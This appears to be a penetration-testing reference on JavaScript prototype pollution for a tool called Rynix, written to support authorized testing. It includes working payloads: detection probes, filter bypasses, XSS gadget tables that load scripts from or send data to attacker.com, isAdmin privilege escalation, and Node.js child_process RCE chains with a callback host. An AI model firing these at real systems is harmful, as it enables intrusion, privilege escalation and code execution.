---
id: PS-PROTO
category: Prototype pollution
wstg_refs: [WSTG-CLNT-02]
lab_count: 10
---

# Prototype Pollution: Attack Technique Reference

## 1. Detection

### 1A. Understanding the Attack

In JavaScript, every object inherits properties from its prototype chain. The `__proto__` property provides direct access to an object's prototype. If an application recursively merges user-controllable input into an object without filtering `__proto__`, the attacker can inject properties onto `Object.prototype`, affecting ALL objects in the application.

**Three requirements for exploitation:**
1. **Source** — attacker-controllable input that reaches a merge/assign operation (URL params, JSON body, form data)
2. **Gadget** — a property that the application reads from an object, inherits from the prototype (not defined directly), and passes to a dangerous sink
3. **Sink** — a function or assignment that causes security impact (innerHTML, eval, src attribute, etc.)

### 1B. Client-Side Detection via URL Parameters

Inject a test property via URL and verify in browser console:

```
# Bracket notation
https://target.com/?__proto__[testproperty]=testvalue

# Dot notation
https://target.com/?__proto__.testproperty=testvalue

# Constructor variant (bypasses __proto__ filters)
https://target.com/?constructor[prototype][testproperty]=testvalue
https://target.com/?constructor.prototype.testproperty=testvalue
```

**Verification in browser console (F12):**

```javascript
// After loading the URL with the pollution payload:
Object.prototype.testproperty
// If returns "testvalue" → CONFIRMED: prototype is pollutable
// If returns undefined → NOT pollutable via this source
```

**Important:** Use a property name that does NOT already exist in the application to avoid false positives. Good test names: `testpollution1234`, `xyzcanary`, `aaapollutiontest`.

### 1C. Client-Side Detection via JSON Input

When the application accepts JSON in API requests or form data:

```json
{
  "username": "normal_value",
  "__proto__": {
    "testproperty": "testvalue"
  }
}
```

**Key difference:** `JSON.parse()` treats `__proto__` as a regular string key (creating an actual property named `__proto__`), but when a recursive merge function processes this parsed object, it follows the `__proto__` reference and pollutes the real prototype.

### 1D. Server-Side Detection

Server-side prototype pollution in Node.js is harder to detect because polluted properties are not directly visible in responses. Use these indirect techniques:

**Technique 1: Status code override**

Node.js `http-errors` module reads `status`/`statusCode` from the prototype:

```json
POST /api/endpoint HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "status": 555
  }
}
```

Then trigger an error on the server (send malformed input). If the error response returns status code 555 instead of the default, pollution is confirmed.

**Technique 2: JSON spaces override**

Express's `json spaces` setting controls JSON indentation. If unset by the developer, it inherits from the prototype:

```json
POST /api/endpoint HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "json spaces": 10
  }
}
```

Then request any JSON endpoint. If the response JSON is now indented with 10 spaces (instead of compact), pollution is confirmed.

**Technique 3: Charset override**

The `body-parser` middleware derives content encoding from request headers or falls back to defaults. Polluting the `content-type` property can force UTF-7 decoding:

```json
POST /api/endpoint HTTP/1.1
Content-Type: application/json; charset=utf-8

{
  "__proto__": {
    "content-type": "application/json; charset=utf-7"
  }
}
```

Then send a subsequent request with a UTF-7 encoded probe:

```json
POST /api/endpoint HTTP/1.1
Content-Type: application/json; charset=utf-8

{
  "username": "+AGYAbwBv-"
}
```

If the server decodes `+AGYAbwBv-` as `"foo"`, the charset pollution worked.

### 1E. browser-debug plugin (Automated)

browser-debug plugin (built into Rynix browser-debug session) can automatically:
1. Detect pollution sources (URL params, JSON body, hash fragment)
2. Identify gadgets (properties read from prototype and passed to sinks)
3. Generate exploitation PoCs

Enable it in  Proxy > Intercept > Open browser > browser-debug plugin settings.

## 2. Techniques

### 2A. Client-Side Prototype Pollution via URL Parameters

The most common client-side vector. Query string parsers (custom or libraries like `qs`, `query-string`) may process `__proto__` as a nested property path.

**Payloads:**

```
# Standard __proto__ pollution
?__proto__[transport_url]=data:,alert(1)//
?__proto__[srcdoc]=<script>alert(1)</script>
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[onload]=alert(1)

# Hash fragment variant
#__proto__[transport_url]=data:,alert(1)//

# Encoded variants
?__proto__%5btransport_url%5d=data:,alert(1)//
?__pro__proto__to__[transport_url]=data:,alert(1)//
```

**Testing methodology:**

1. Confirm pollution: `?__proto__[canary]=yes` then check `Object.prototype.canary` in console
2. If confirmed, identify gadgets (see Section 4)
3. Craft payload targeting the identified gadget

> Lab refs: PS-PROTO-01, PS-PROTO-02, PS-PROTO-03

### 2B. Client-Side Prototype Pollution via JSON Input

When applications accept JSON data and use recursive merge/extend functions:

```json
{
  "name": "normal",
  "__proto__": {
    "isAdmin": true
  }
}
```

**Merge function vulnerability pattern:**

```javascript
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];  // When key is "__proto__", this pollutes the prototype
        }
    }
}
```

**Testing via API request:**

```bash
http_probe -sk -X POST \
  -H "Content-Type: application/json" \
  -d '{"name":"test","__proto__":{"polluted":"yes"}}' \
  https://target.com/api/profile
```

> Lab refs: PS-PROTO-04

### 2C. DOM XSS via Prototype Pollution

After polluting the prototype, if the application reads an undefined property and passes it to a DOM XSS sink, the polluted value is used instead.

**Common gadget-to-sink chains:**

| Gadget Property | Sink | Payload |
|----------------|------|---------|
| `transport_url` | Script `src` attribute | `data:,alert(1)//` |
| `srcdoc` | iframe `srcdoc` attribute | `<script>alert(1)</script>` |
| `innerHTML` | `element.innerHTML` assignment | `<img src=x onerror=alert(1)>` |
| `source_url` | Script `src` attribute | `data:,alert(1)//` |
| `url` | Fetch/XHR target | `javascript:alert(1)` |
| `href` | Anchor `href` attribute | `javascript:alert(1)` |
| `src` | Image/script/iframe `src` | `data:text/html,<script>alert(1)</script>` |
| `sequence` | Passed to `eval()` or `Function()` | `alert(1)` |
| `onload` | Element event handler | `alert(1)` |
| `onerror` | Element event handler | `alert(1)` |

**Example exploitation chain:**

```
# Step 1: Application code reads config.transport_url (undefined, inherits from prototype)
# Step 2: Application sets scriptElement.src = config.transport_url
# Step 3: Attacker pollutes Object.prototype.transport_url

# Exploit URL:
https://target.com/?__proto__[transport_url]=data:,alert(1)//
```

> Lab refs: PS-PROTO-01, PS-PROTO-02, PS-PROTO-03

### 2D. Bypassing Prototype Pollution Sanitization

When the application strips `__proto__` from input keys, use these bypass techniques:

**Bypass 1: constructor.prototype (always works as an alternative path)**

```
# Instead of:
?__proto__[gadget]=payload

# Use:
?constructor[prototype][gadget]=payload
?constructor.prototype.gadget=payload
```

**Reason:** `myObject.constructor.prototype` refers to the same object as `myObject.__proto__`. Sanitizers that block `__proto__` often forget `constructor.prototype`.

**Bypass 2: Double encoding / recursive stripping**

If the sanitizer does a single-pass strip of `__proto__`:

```
# Input that becomes __proto__ after stripping:
?__pro__proto__to__[gadget]=payload

# After sanitizer strips "__proto__" from the middle:
?__proto__[gadget]=payload
```

**Bypass 3: Case variation (depends on sanitizer implementation)**

```
?__Proto__[gadget]=payload
?__PROTO__[gadget]=payload
```

**Bypass 4: Unicode/encoding tricks**

```
?__%70roto__[gadget]=payload
?__proto%5b%67adget%5d=payload
```

> Lab refs: PS-PROTO-04

### 2E. Server-Side Prototype Pollution for Privilege Escalation

When a Node.js application uses a recursive merge to update user settings, and the authorization check reads a property like `isAdmin` or `role` from the user object:

**Vulnerable pattern:**

```javascript
// Server code
let userConfig = {};
merge(userConfig, req.body);  // Recursive merge with user input

// Later, authorization check:
if (user.isAdmin) {  // isAdmin is not defined on user → inherits from prototype
    allowAdminAccess();
}
```

**Exploitation payload:**

```bash
http_probe -sk -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=USER_SESSION" \
  -d '{"name":"test","__proto__":{"isAdmin":true}}' \
  https://target.com/api/settings
```

**Common privilege escalation properties:**

```json
{"__proto__": {"isAdmin": true}}
{"__proto__": {"role": "admin"}}
{"__proto__": {"admin": true}}
{"__proto__": {"access_level": 9}}
{"__proto__": {"permissions": ["admin"]}}
{"__proto__": {"verified": true}}
```

> Lab refs: PS-PROTO-06

### 2F. Server-Side Detection Without Polluted Reflection

When polluted properties are not reflected in responses, use these behavioral probes to confirm server-side pollution is possible:

**Probe 1: Status code override**

```bash
# Step 1: Pollute the status property
http_probe -sk -X POST \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"status":555}}' \
  https://target.com/api/endpoint

# Step 2: Trigger an error (send invalid JSON)
http_probe -sk -X POST \
  -H "Content-Type: application/json" \
  -d '{invalid}' \
  https://target.com/api/endpoint

# If response status is 555 instead of 400 → pollution confirmed
```

**Probe 2: JSON spaces override**

```bash
# Step 1: Pollute json spaces
http_probe -sk -X POST \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"json spaces":10}}' \
  https://target.com/api/endpoint

# Step 2: Request any JSON endpoint
http_probe -sk https://target.com/api/data

# If JSON response is now indented with 10 spaces → pollution confirmed
```

**Probe 3: Charset override**

```bash
# Step 1: Pollute content-type charset
http_probe -sk -X POST \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"content-type":"application/json; charset=utf-7"}}' \
  https://target.com/api/endpoint

# Step 2: Send UTF-7 encoded data
http_probe -sk -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"+AGYAbwBv-"}' \
  https://target.com/api/endpoint

# If server processes "+AGYAbwBv-" as "foo" → pollution confirmed
```

> Lab refs: PS-PROTO-07, PS-PROTO-08

### 2G. Server-Side RCE via child_process

When server-side prototype pollution is confirmed, escalate to remote code execution by polluting properties that Node.js `child_process` methods read from the prototype.

**Target 1: child_process.fork() via execArgv**

The `fork()` method reads `execArgv` from the options object. If options is a plain object, it inherits polluted `execArgv` from the prototype:

```bash
http_probe -sk -X POST \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"execArgv":["--eval=require(\"child_process\").execSync(\"id\")"]}}' \
  https://target.com/api/endpoint
```

**Target 2: child_process.execSync() via shell + input**

Pollute both `shell` and `input` to inject commands via an alternative shell that accepts arbitrary input:

```bash
# Use vim as the shell — it accepts command execution via :! syntax
http_probe -sk -X POST \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"shell":"vim","input":":! id > /tmp/pwned\n"}}' \
  https://target.com/api/endpoint
```

**Note:** The `shell` option only accepts the executable name without arguments. Using `node` as the shell is tricky because it validates syntax before execution.

**Target 3: NODE_OPTIONS environment variable**

Pollute `NODE_OPTIONS` to inject command-line flags that execute on the next Node.js process spawn:

```bash
# Trigger DNS callback to confirm RCE
http_probe -sk -X POST \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"NODE_OPTIONS":"--inspect=ATTACKER-CALLBACK-SERVER.com"}}' \
  https://target.com/api/endpoint
```

**Target 4: env property pollution**

Pollute environment variables that will be inherited by child processes:

```bash
http_probe -sk -X POST \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"env":{"NODE_OPTIONS":"--require=/proc/self/environ","PAYLOAD":"require(\"child_process\").execSync(\"id\")"}}}' \
  https://target.com/api/endpoint
```

**Triggering child_process execution:**

The RCE payload takes effect when the server spawns a child process. Common triggers:
- File upload processing (ImageMagick, ffmpeg)
- PDF generation
- Email sending (sendmail)
- Scheduled tasks / cron jobs
- Any feature that shells out to a system command

> Lab refs: PS-PROTO-09, PS-PROTO-10

## 3. Pollution Vectors

| Vector | Syntax | Notes |
|--------|--------|-------|
| URL query parameter | `?__proto__[prop]=val` | Most common client-side vector |
| URL hash fragment | `#__proto__[prop]=val` | Not sent to server (client-side only) |
| JSON body | `{"__proto__":{"prop":"val"}}` | Server-side and client-side |
| Form data | `__proto__[prop]=val` | If parsed by vulnerable body parser |
| URL path segments | `/api/__proto__/prop/val` | Rare; depends on routing framework |
| HTTP headers | Custom merge of header objects | Rare; depends on application logic |

## 4. Gadget Library

Common properties that applications read from objects without checking `hasOwnProperty`, making them exploitable when polluted:

### 4A. Client-Side Gadgets (DOM XSS)

| Property | Typical Sink | Example Payload | Found In |
|----------|-------------|-----------------|----------|
| `transport_url` | `<script src=>` | `data:,alert(1)//` | Custom analytics/tracking code |
| `srcdoc` | `<iframe srcdoc=>` | `<script>alert(1)</script>` | Iframe rendering libraries |
| `innerHTML` | `element.innerHTML` | `<img src=x onerror=alert(1)>` | UI rendering code |
| `source_url` | `<script src=>` | `//attacker.com/evil.js` | Module loaders |
| `url` | `fetch()` / `XMLHttpRequest` | `//attacker.com/steal?d=` + data | Data fetching code |
| `href` | `<a href=>` | `javascript:alert(1)` | Navigation/link code |
| `src` | `<img src=>` / `<script src=>` | `//attacker.com/evil.js` | Media rendering code |
| `type` | `<script type=>` | `text/html` | Script loading code |
| `text` | `element.textContent` (if sink) | Arbitrary text | Template rendering |
| `onload` | Event handler attribute | `alert(1)` | Dynamic element creation |
| `onerror` | Event handler attribute | `alert(1)` | Error handling in DOM |
| `value` | Form field values | Arbitrary data | Form pre-population |

### 4B. Server-Side Gadgets (Node.js)

| Property | Effect | Impact |
|----------|--------|--------|
| `isAdmin` / `admin` / `role` | Privilege check bypass | Privilege escalation |
| `status` / `statusCode` | HTTP error status override | Detection confirmation |
| `json spaces` | JSON indentation change | Detection confirmation |
| `content-type` | Response encoding change | Detection confirmation |
| `shell` | Command interpreter for execSync | RCE (with `input`) |
| `input` | stdin for spawned process | RCE (with `shell`) |
| `execArgv` | Node.js CLI arguments for fork() | RCE |
| `NODE_OPTIONS` | Default Node.js flags | RCE / information disclosure |
| `env` | Environment variables for child processes | RCE |
| `argv0` | Process name override | Limited impact |
| `timeout` | Process timeout override | DoS |

## 5. Testing Methodology

### Step 1: Detect Pollution Source

```
# Client-side: try URL params
https://target.com/?__proto__[canary123]=polluted

# Verify in console:
Object.prototype.canary123  // Should return "polluted"

# If blocked, try constructor bypass:
https://target.com/?constructor[prototype][canary123]=polluted

# Server-side: try JSON body
curl -X POST -H "Content-Type: application/json" \
  -d '{"__proto__":{"status":555}}' target.com/api/endpoint
# Then trigger an error to check if status code changed
```

### Step 2: Confirm Pollution Takes Effect

- Client-side: check `Object.prototype.canary123` in browser console
- Server-side: use behavioral probes (status code, JSON spaces, charset override)

### Step 3: Find Exploitable Gadget

**Manual approach:**

1. Search application JavaScript for property access patterns on configuration objects
2. Look for patterns: `config.propertyName`, `options.propertyName`, `settings.propertyName`
3. Check if the property is ever explicitly defined — if not, it will inherit from the polluted prototype
4. Trace where the property value is used — if it reaches a sink, it is a gadget

**Monitor property access via defineProperty:**

```javascript
Object.defineProperty(Object.prototype, 'PROPERTY_TO_MONITOR', {
    get: function() {
        console.trace('Accessed PROPERTY_TO_MONITOR');
        return undefined;
    },
    configurable: true
});
```

**Automated approach:** Use browser-debug plugin via http_probe's browser to scan for gadgets automatically.

### Step 4: Exploit the Gadget

Once a gadget is identified, craft the pollution payload targeting that specific property:

```
# If gadget is "transport_url" used as script src:
?__proto__[transport_url]=data:,alert(1)//

# If gadget is "srcdoc" used as iframe content:
?__proto__[srcdoc]=<script>alert(1)</script>

# If gadget is "isAdmin" used in auth check:
{"__proto__":{"isAdmin":true}}
```

### Step 5: Validate Exploitation

- Client-side: Confirm XSS fires (alert, callback to attacker server)
- Server-side privilege escalation: Confirm access to admin functionality
- Server-side RCE: Confirm command execution (DNS callback, file creation, out-of-band request)
## Rynix workflow

1. `get_technique_guide` for `prototype-pollution` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `browser-debug plugin`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `browser-debug plugin`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

